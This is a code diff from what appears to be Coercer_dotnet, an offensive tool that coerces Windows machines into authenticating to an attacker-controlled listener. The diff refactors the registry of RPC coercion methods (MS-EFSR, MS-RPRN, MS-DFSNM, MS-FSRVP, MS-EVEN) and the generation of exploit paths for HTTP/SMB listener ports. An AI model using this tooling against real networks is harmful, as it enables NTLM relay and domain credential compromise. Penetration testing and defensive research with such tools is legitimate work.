@@ -5,30 +5,60 @@ namespace Coercer_dotnet.methods
 {
     public class AvailableMethods
     {
-        public Method[] Methods { get; }
+        public Type[] Methods { get; }
 
         public AvailableMethods()
         {
-            Methods = new Method[]
+            Methods = new Type[]
             {
-                new MS_DFSNM.NetrDfsAddStdRoot(),
-                new MS_DFSNM.NetrDfsRemoveStdRoot(),
-                new MS_EFSR.EfsRpcAddUsersToFile(),
-                new MS_EFSR.EfsRpcAddUsersToFileEx(),
-                new MS_EFSR.EfsRpcDecryptFileSrv(),
-                new MS_EFSR.EfsRpcDuplicateEncryptionInfoFile(),
-                new MS_EFSR.EfsRpcEncryptFileSrv(),
-                new MS_EFSR.EfsRpcFileKeyInfo(),
-                new MS_EFSR.EfsRpcOpenFileRaw(),
-                new MS_EFSR.EfsRpcQueryRecoveryAgents(),
-                new MS_EFSR.EfsRpcQueryUsersOnFile(),
-                new MS_EFSR.EfsRpcRemoveUsersFromFile(),
-                new MS_EVEN.ElfrOpenBELW(),
-                new MS_FSRVP.IsPathShadowCopied(),
-                new MS_FSRVP.IsPathSupported(),
-                new MS_RPRN.RpcRemoteFindFirstPrinterChangeNotification(),
-                new MS_RPRN.RpcRemoteFindFirstPrinterChangeNotificationEx()
+                typeof(MS_DFSNM.NetrDfsAddStdRoot),
+                typeof(MS_DFSNM.NetrDfsRemoveStdRoot),
+                typeof(MS_EFSR.EfsRpcAddUsersToFile),
+                typeof(MS_EFSR.EfsRpcAddUsersToFileEx),
+                typeof(MS_EFSR.EfsRpcDecryptFileSrv),
+                typeof(MS_EFSR.EfsRpcDuplicateEncryptionInfoFile),
+                typeof(MS_EFSR.EfsRpcEncryptFileSrv),
+                typeof(MS_EFSR.EfsRpcFileKeyInfo),
+                typeof(MS_EFSR.EfsRpcOpenFileRaw),
+                typeof(MS_EFSR.EfsRpcQueryRecoveryAgents),
+                typeof(MS_EFSR.EfsRpcQueryUsersOnFile),
+                typeof(MS_EFSR.EfsRpcRemoveUsersFromFile),
+                typeof(MS_EVEN.ElfrOpenBELW),
+                typeof(MS_FSRVP.IsPathShadowCopied),
+                typeof(MS_FSRVP.IsPathSupported),
+                typeof(MS_RPRN.RpcRemoteFindFirstPrinterChangeNotification),
+                typeof(MS_RPRN.RpcRemoteFindFirstPrinterChangeNotificationEx)
             };
+        }
+
+        public Method Instantiate(int methodIndex, AuthType authType, string listener)
+        {
+            return (Method)(Activator.CreateInstance(Methods[methodIndex], new object[] { authType, listener }) ?? throw new Exception("Failed to instantiate method object."));
+        }
+
+        public Method Instantiate(int methodIndex, AuthType authType, string listener, int port)
+        {
+            return (Method)(Activator.CreateInstance(Methods[methodIndex], new object[] { authType, listener, port }) ?? throw new Exception("Failed to instantiate method object."));
+        }
+
+        public Method Instantiate(int methodIndex, AuthType authType, string listener, int httpPort, int smbPort)
+        {
+            return (Method)(Activator.CreateInstance(Methods[methodIndex], new object[] { authType, listener, httpPort, smbPort }) ?? throw new Exception("Failed to instantiate method object."));
+        }
+
+        public static Method Instantiate<T>(AuthType authType, string listener) where T : Method
+        {
+            return (Method)(Activator.CreateInstance(typeof(T), new object[] { authType, listener }) ?? throw new Exception("Failed to instantiate method object."));
+        }
+
+        public static Method Instantiate<T>(AuthType authType, string listener, int port) where T : Method
+        {
+            return (Method)(Activator.CreateInstance(typeof(T), new object[] { authType, listener, port }) ?? throw new Exception("Failed to instantiate method object."));
+        }
+
+        public static Method Instantiate<T>(AuthType authType, string listener, int httpPort, int smbPort) where T : Method
+        {
+            return (Method)(Activator.CreateInstance(typeof(T), new object[] { authType, listener, httpPort, smbPort }) ?? throw new Exception("Failed to instantiate method object."));
         }
     }
 
@@ -36,11 +66,66 @@ namespace Coercer_dotnet.methods
     {
         public abstract string Description { get; }
         public abstract string Author { get; }
-        public abstract ExploitPath[] ExploitPaths { get; }
+        public abstract ExploitPathTemplate[] ExploitPathTemplates { get; }
+        public string[] ExploitPaths { get; }
         public abstract NcanNpAccess[] NcanNpAccesses { get; }
         public abstract NcacnIpTcpAccess[] NcacnIpTcpAccesses { get; }
         public abstract Protocol Protocol { get; }
         public abstract Function Function { get; }
+
+        public Method(AuthType authType, string listener)
+        {
+            ExploitPaths = ExploitPathTemplates.Where(template => authType == AuthType.NONE || authType == template.AuthType).Select(template => template.Generate(listener)).ToArray();
+        }
+
+        public Method(AuthType authType, string listener, int port)
+        {
+            if (authType == AuthType.NONE)
+            {
+                throw new Exception("If auth type is none, must provide ports for both types.");
+            }
+            ExploitPaths = ExploitPathTemplates.Where(template => authType == template.AuthType).Select(template => template.Generate(listener, port)).ToArray();
+        }
+
+        public Method(AuthType authType, string listener, int httpPort, int smbPort)
+        {
+            ExploitPaths = ExploitPathTemplates.Where(template => authType == AuthType.NONE || authType == template.AuthType).Select(template => template.Generate(listener, template.AuthType == AuthType.HTTP ? httpPort : template.AuthType == AuthType.SMB ? smbPort : throw new Exception("Auth Type cannot be none."))).ToArray();
+        }
+
+        public void Print(string path)
+        {
+            Console.Write(Protocol.ShortName);
+            Console.Write("──>");
+            Console.ForegroundColor = ConsoleColor.Cyan;
+            Console.Write(Function.Name);
+            Console.ResetColor();
+            string[] vulnerableArguments = Function.VulnerableArguments;
+            for (int i = 0; i < vulnerableArguments.Length; i++)
+            {
+                string vulnerableArgument = vulnerableArguments[i];
+                if (i == 0)
+                {
+                    Console.Write("(");
+                }
+
+                Console.ForegroundColor = ConsoleColor.Blue;
+                Console.Write(vulnerableArgument);
+                Console.ResetColor();
+                Console.Write("=");
+                Console.ForegroundColor = ConsoleColor.Yellow;
+                Console.Write($"'{path}'");
+                Console.ResetColor();
+
+                if (i == (vulnerableArguments.Length - 1))
+                {
+                    Console.Write(")");
+                }
+                else
+                {
+                    Console.Write(", ");
+                }
+            }
+        }
 
         // public abstract void Trigger();
     }
@@ -98,7 +183,7 @@ namespace Coercer_dotnet.methods
         }
     }
 
-    public class ExploitPath
+    public class ExploitPathTemplate
     {
         private static readonly string regexPattern = @"\{\{(\d+)\}\}";
         private static readonly string randomStringAvailableChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
@@ -106,7 +191,7 @@ namespace Coercer_dotnet.methods
         public AuthType AuthType { get; }
         public string Template { get; }
 
-        public ExploitPath(AuthType authType, string template)
+        public ExploitPathTemplate(AuthType authType, string template)
         {
             AuthType = authType;
             Template = template;
